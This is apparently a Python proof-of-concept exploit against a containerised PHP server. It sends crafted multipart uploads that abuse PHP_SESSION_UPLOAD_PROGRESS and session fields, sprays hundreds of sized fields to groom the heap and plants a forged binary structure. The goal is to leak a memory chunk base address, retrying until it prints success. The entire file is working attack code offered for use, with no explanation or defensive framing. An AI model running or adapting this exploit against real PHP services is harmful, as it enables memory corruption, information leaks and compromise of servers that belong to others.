#!/usr/bin/env python3
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from p2s8335_lib import *

for attempt in range(1, 5):
    print(f"=== attempt {attempt} ===", flush=True)
    if not container_ok(PORT):
        print("  container down, restarting", flush=True)
        restart()
    rotate(PORT)
    # A
    parts = [{"name":f"p{i:04d}","data":b"x"} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              {"name":"f","filename":"a.txt","data":b"A"*64},
              {"name":"big","data":b"B"*(BIG_MB*1024*1024)}]
    ra = send_raw(PORT, build_multipart(parts, b"S"*17), timeout=120)
    head = ra.split(b"\r\n\r\n")[0].decode("latin1","replace") if ra else "EMPTY"
    print(f"  A: {len(ra)}B", flush=True)
    for line in head.splitlines()[:5]:
        print(f"    {line}", flush=True)
    time.sleep(0.2)
    # B
    parts = [{"name":"PHPSESSID","data":SID},
             {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    for i in range(841):
        val = (f"v{i:04d}"+"x"*44)[:48]
        parts.append({"name":str(1000+i),"data":val.encode()})
    forge = bytearray(b"A"*79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name":"1999","data":bytes(forge)})
    rb = send_raw(PORT, build_multipart(parts, b"B"*10), timeout=60)
    print(f"  B: {len(rb)}B", flush=True)
    base = parse_chunk_base(rb)
    print(f"  chunk base = 0x{base:x}" if base else "  NO LEAK", flush=True)
    if base:
        print(f"[+] SUCCESS", flush=True)
        break
    time.sleep(0.5)
